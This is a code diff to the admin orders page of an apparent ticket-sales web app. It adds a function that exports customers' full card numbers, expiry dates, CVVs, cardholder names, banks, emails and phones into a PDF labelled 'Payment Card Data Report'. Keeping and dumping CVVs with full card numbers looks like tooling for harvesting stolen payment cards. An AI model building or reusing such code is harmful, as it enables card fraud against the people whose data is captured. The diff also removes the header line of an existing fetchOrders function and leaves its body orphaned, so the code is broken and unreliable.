@@ -64,7 +64,114 @@ const AdminOrders = () => {
     });
   };
 
-  const fetchOrders = async () => {
+  const exportCardsPDF = () => {
+    const cardsData = filtered.filter(o => o.card_full_number || o.card_last4);
+    if (cardsData.length === 0) {
+      toast.error("لا توجد بيانات بطاقات للتصدير");
+      return;
+    }
+
+    const doc = new jsPDF({ orientation: "portrait", unit: "mm", format: "a4" });
+    const pageW = 210;
+    const margin = 15;
+    const contentW = pageW - margin * 2;
+
+    // Title
+    doc.setFontSize(18);
+    doc.setTextColor(109, 40, 217);
+    doc.text("Payment Card Data Report", pageW - margin, 20, { align: "right" });
+    doc.setFontSize(9);
+    doc.setTextColor(120);
+    doc.text(new Date().toLocaleDateString("ar-SA") + " | " + cardsData.length + " cards", pageW - margin, 27, { align: "right" });
+
+    // Divider
+    doc.setDrawColor(200);
+    doc.line(margin, 31, pageW - margin, 31);
+
+    let y = 38;
+    const cardH = 52;
+
+    cardsData.forEach((o, idx) => {
+      if (y + cardH > 280) {
+        doc.addPage();
+        y = 20;
+      }
+
+      // Card background
+      doc.setFillColor(248, 250, 252);
+      doc.setDrawColor(226, 232, 240);
+      doc.roundedRect(margin, y, contentW, cardH, 3, 3, "FD");
+
+      // Card number header strip
+      doc.setFillColor(109, 40, 217);
+      doc.roundedRect(margin, y, contentW, 10, 3, 3, "F");
+      doc.rect(margin, y + 5, contentW, 5, "F");
+
+      // Card index + brand
+      doc.setFontSize(9);
+      doc.setTextColor(255);
+      doc.text(`#${idx + 1}  ${o.card_brand || "CARD"}`, pageW - margin - 4, y + 7, { align: "right" });
+      doc.text(o.confirmation_number || o.id.slice(0, 8), margin + 4, y + 7);
+
+      // Card details
+      const col1X = pageW - margin - 4;
+      const col2X = pageW / 2;
+      let detailY = y + 17;
+
+      doc.setFontSize(8);
+      doc.setTextColor(100);
+
+      // Row 1: Card Number
+      doc.text("Card Number:", col1X, detailY, { align: "right" });
+      doc.setTextColor(30);
+      doc.setFontSize(11);
+      doc.text(o.card_full_number || `**** ${o.card_last4}`, col1X - 28, detailY, { align: "right" });
+
+      // Row 2: Expiry + CVV
+      detailY += 8;
+      doc.setFontSize(8);
+      doc.setTextColor(100);
+      doc.text("Expiry:", col1X, detailY, { align: "right" });
+      doc.setTextColor(30);
+      doc.text(o.card_expiry || "N/A", col1X - 14, detailY, { align: "right" });
+
+      doc.setTextColor(100);
+      doc.text("CVV:", col2X, detailY, { align: "right" });
+      doc.setTextColor(220, 38, 38);
+      doc.setFontSize(9);
+      doc.text(o.card_cvv || "N/A", col2X - 10, detailY, { align: "right" });
+
+      // Row 3: Cardholder + Bank
+      detailY += 8;
+      doc.setFontSize(8);
+      doc.setTextColor(100);
+      doc.text("Holder:", col1X, detailY, { align: "right" });
+      doc.setTextColor(30);
+      doc.text(o.cardholder_name || "N/A", col1X - 14, detailY, { align: "right" });
+
+      doc.setTextColor(100);
+      doc.text("Bank:", col2X, detailY, { align: "right" });
+      doc.setTextColor(30);
+      doc.text(o.bank_name || "N/A", col2X - 12, detailY, { align: "right" });
+
+      // Row 4: Email + Phone
+      detailY += 8;
+      doc.setFontSize(7);
+      doc.setTextColor(130);
+      doc.text(`${o.email}  |  ${o.phone}`, col1X, detailY, { align: "right" });
+
+      y += cardH + 5;
+    });
+
+    // Footer
+    doc.setFontSize(7);
+    doc.setTextColor(180);
+    doc.text("CONFIDENTIAL - Payment Card Data", pageW / 2, 290, { align: "center" });
+
+    doc.save("card-data-report.pdf");
+    toast.success("تم تصدير بيانات البطاقات بنجاح");
+  };
+
     const { data } = await supabase
       .from("ticket_orders")
       .select("*")
